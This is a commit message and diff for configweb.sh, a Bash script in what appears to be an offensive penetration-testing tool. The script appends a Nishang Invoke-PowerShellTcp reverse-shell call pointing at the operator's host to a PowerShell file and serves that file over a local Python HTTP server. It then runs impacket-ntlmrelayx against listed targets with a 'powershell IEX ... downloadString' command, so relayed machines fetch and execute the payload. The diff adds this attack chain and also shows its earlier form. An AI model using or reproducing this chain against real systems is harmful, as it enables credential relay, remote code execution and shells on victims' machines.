feat: update
CHANGES:
+ Added -v|--version parameter to show the tool version.
+ Modification in the functions to update the tool.
+ Modification in the edition of Responder.conf.
+ Modification in the request of information from the user.
+ Modification in ntlmrelayx command.
+ Modification when using the --install parameter to correctly install the dependencies and the Terminator terminal configuration.

+++ src/configweb.sh
@@ -1,13 +1,14 @@
 #!/usr/bin/env bash
 
 LBlue='\033[0;94m'      # Ligth Blue
+BRed='\033[1;31m'       # Bold Red
 BBlue='\033[1;34m'      # Bold Blue
 BWhite='\033[1;37m'     # Bold White
 Color_Off='\033[0m'     # Text Reset
 
 tput civis
 
-while [ ! -f .attack ];do
+while [[ ! -f .attack && ! -f host.txt ]];do
     clear
     echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Web Server...${Color_Off}\n"
     sleep 5
@@ -16,14 +17,23 @@ done
 HOST=$(cat host.txt)
 
 # Copiar Script de Nishan en PowerShell
-cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+if [ -f "/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1" ]; then
+    cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+else
+    echo -e "${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error copying PS.ps1${Color_Off}"
+    exit 1
+fi
 
 # Agregando parametros al script de Nishang
 echo "" >> PS.ps1
 echo "Invoke-PowerShellTcp -Reverse -IPAddress $HOST -Port 5040" >> PS.ps1
 
 # Levantando servidor web local
-python3 -m http.server &>/dev/null &
+PORT=${1:-8080}  # Puerto por defecto: 8000
+python3 -m http.server "$PORT" &>/dev/null &
 
-# Enviando peticion para descarga del script
-ntlmrelayx.py -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:8000/PS.ps1')" -smb2support
+# Ejecutar ntlmrelayx con verificación
+impacket-ntlmrelayx -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:$PORT/PS.ps1')" -smb2support || {
+    echo -e "${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error executing impacket-ntlmrelayx${Color_Off}"
+    #exit 1
+}
